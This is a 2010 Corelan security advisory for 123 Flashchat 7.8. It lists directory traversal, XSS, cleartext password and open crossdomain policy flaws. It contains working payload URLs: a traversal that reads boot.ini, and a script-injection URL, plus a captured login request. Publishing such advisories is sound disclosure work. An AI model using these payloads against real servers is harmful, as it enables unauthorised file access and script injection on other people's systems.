@@ -1,0 +1,65 @@
+        |------------------------------------------------------------------|
+        |                         __               __                      |
+        |   _________  ________  / /___ _____     / /____  ____ _____ ___  |
+        |  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |
+        | / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |
+        | \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |
+        |                                                                  |
+        |                                       http://www.corelan.be:8800 |
+        |                                              security@corelan.be |
+        |                                                                  |
+        |-------------------------------------------------[ EIP Hunters ]--|
+ 
+# Software      : 123 Flashchat version 7.8 Remote
+# Author        : Lincoln
+# Date          : August 16, 2010
+# Reference     : http://www.corelan.be:8800/advisories.php?id=CORELAN-10-060
+# OS            : Windows
+# Tested on     : XP SP3 En (Virtual box)
+# Type of vuln  : Multiple Remote Vulnerabilities
+# Greetz to     : Corelan Security Team
+# http://www.corelan.be:8800/index.php/security/corelan-team-members/
+# Script provided 'as is', without any warranty.
+# Use for educational purposes only.
+# Do not use this code to do anything illegal !
+#
+# Note : you are not allowed to edit/modify this code.
+# If you do, Corelan cannot be held responsible for any damages this may cause.
+
+
+
+0x01 : Directory Traversal
+
+http://192.168.2.15:35555/%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cboot.ini
+
+
+0x02 : XSS
+
+http://192.168.2.15:35555/index.html%27%22--%3E%3Cscript%3Ealert%28%22Corelan%22%29%3C/script%3E
+
+
+0x03 : Password sent via clear test
+
+http://127.0.0.1:35555/lite-chat-login.html
+
+GET /lite.swf HTTP/1.1
+Host: 192.168.2.15:35555
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729)
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5A
+ccept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 115
+Connection: keep-alive
+Referer: http://192.168.2.15:35555/lite_client.html?init_user=admin&init_password=mycoolpassword&init_room=1&init_skin=blue
+
+
+0x04 : Open Crossdomain Policy 
+
+http://127.0.0.1:35555/crossdomain.xml  
+
+Policy Rules: <allow-access-from domain="*" secure="false" />
+
+<policy-file-request/>.<cross-domain-policy><allow-access-from to-ports="51127" domain="*"></allow-access-from></cross-domain-policy>.
+
+"Open Policy Crossdomain.xml file allows other SWF files to make HTTP requests to your web server and see its response. This can be used for accessing one time tokens and CSRF nonces to bypass CSRF restrictions." Netsparker web app scanner
